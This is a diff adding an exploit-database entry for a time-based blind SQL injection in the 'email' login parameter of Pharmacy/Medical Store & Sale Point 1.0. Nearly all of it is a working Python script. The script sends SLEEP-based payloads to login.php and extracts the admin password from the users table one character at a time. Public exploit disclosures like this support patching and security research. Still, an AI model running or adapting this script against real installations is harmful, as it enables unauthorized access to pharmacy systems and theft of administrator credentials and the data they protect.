@@ -1,0 +1,83 @@
+# Exploit Title: Pharmacy/Medical Store & Sale Point 1.0  - 'email' SQL Injection
+# Date: 2020-08-23
+# Exploit Author: @naivenom
+# Vendor Homepage: https://www.sourcecodester.com/php/14398/pharmacymedical-store-sale-point-using-phpmysql-bootstrap-framework.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14398&title=Pharmacy%2FMedical+Store+%26+Sale+Point+Using+PHP%2FMySQL+with+Bootstrap+Framework
+# Version: 1.0
+# Tested on: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+
+This parameter "email" is vulnerable to Time-Based blind SQL injection
+in this path "/medical/login.php " that leads to retrieve all
+databases.
+
+#exploit
+
+import re
+import requests
+from bs4 import BeautifulSoup
+import sys
+import urllib3
+import time
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# We can test the time based blind sqli with this script. This script
+testing with each character of the password column from users name
+table
+
+# and retrieve password from admin user.
+
+def time_based_blind_sqli(injection_string):
+
+    target = "http://localhost:81/medical-store-source/login.php"
+
+    for j in range(32,126):
+
+        data = {'email': "%s" % (injection_string.replace("[CHAR]", str(j))),
+
+        'password':'xJXb',
+
+        'login':''}
+
+        tim = time.time()
+
+        r = requests.post(target,data = data, verify=False)
+
+        nowtime = time.time()
+
+        curren = nowtime-tim
+
+        if curren <= 4:
+
+            return j
+
+    return None
+
+def main():
+
+    print("\n(+) Retrieving password from admin user...")
+
+    # 5 is length of the password. This can
+
+    # be dynamically stolen from the database as well!
+
+    for i in range(1,5):
+
+        injection_string = "admin@admin.com' AND (SELECT 1100 FROM
+(SELECT(SLEEP(4-(IF(ORD(MID((SELECT IFNULL(CAST(password AS
+NCHAR),0x20) FROM store.users ORDER BY password LIMIT
+0,1),%d,1))>[CHAR],0,1)))))soLu) AND 'yHIV'='yHIV" % i
+
+        extracted_char = chr(time_based_blind_sqli(injection_string))
+
+        sys.stdout.write(extracted_char)
+
+        sys.stdout.flush()
+
+    print("\n(+) done!")
+
+
+
+if __name__ == "__main__":
+
+    main()
